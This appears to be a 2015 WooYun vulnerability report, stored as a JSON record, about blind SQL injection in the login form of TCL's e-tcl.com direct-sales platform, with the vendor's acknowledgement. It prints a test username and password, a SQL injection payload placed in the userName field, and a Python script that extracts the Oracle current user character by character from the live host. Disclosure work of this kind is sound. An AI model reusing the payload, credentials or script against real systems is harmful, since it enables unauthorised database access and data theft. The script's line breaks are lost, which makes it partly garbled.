{"id": 37207, "wybug_id": "wooyun-2015-0100223", "wybug_title": "TCL某直销平台Oracle盲注(附验证脚本)", "wybug_corp": "TCL官方网上商城", "wybug_author": "路人甲", "wybug_date": "2015-03-09 09:53", "wybug_open_date": "2015-04-23 09:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-23：\t细节向公众公开  简要描述：  详细说明：  \nhttp://www.e-tcl.com/\nTCL冰箱洗衣机直销平台，存在盲注。这个盲注需要一枚账号才能成功，因为这枚正确的账号会产生盲注的比对页面，试了一下，没有正确的账号貌似不行~反正该账号内网才能用，我就不打码了：\n用户名：test  密码：123456\n当用正确的账号登陆时，会提示“只能在局域网使用”，思路正来自于此。\n\n\nPOST http://www.e-tcl.com/web/SubmitLogin.dovalue(entcode)=tclbx&value(password)=123456&value(userName)=test'and/**/length(SYS_CONTEXT('USERENV','CURRENT_USER'))='5&value(verifycode)=g\n当为真时，提示只能在局域网内使用：\n\n为假时出现登陆界面：\n\n可以猜解出猜解current_user长度为5：\n\n猜解current_user，得到：\nTCLBX\n\n\n验证脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {'Content-Type': 'application/x-www-form-urlencoded'}payloads = list(string.ascii_uppercase)#payloads = list('T')print 'start to retrive Oracle user:'user = ''for i in range(1,6):    for payload in payloads:        conn = httplib.HTTPConnection('www.e-tcl.com', timeout=60)        params = {            'value(entcode)': 'tclbx',            'value(password)': '123456',            'value(userName)': \"test'and/**/ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))='%s\" % (i, ord(payload)),            'value(verifycode)': 'g',            }        conn.request(method='POST',                     url='/web/SubmitLogin.do',                     body = urllib.urlencode(params),                     headers = headers)        resp = conn.getresponse()        html_doc = resp.read().decode('utf-8')        conn.close()        #print html_doc        print '.',        if html_doc.find(u'您只能在局域网使用本系统') > 0:  # True            user += payload            print '\\n[in progress]', user            breakprint '\\nOracle user is', user\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-03-09 09:59 厂商回复： 感谢你的工作，已转交相关人员处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}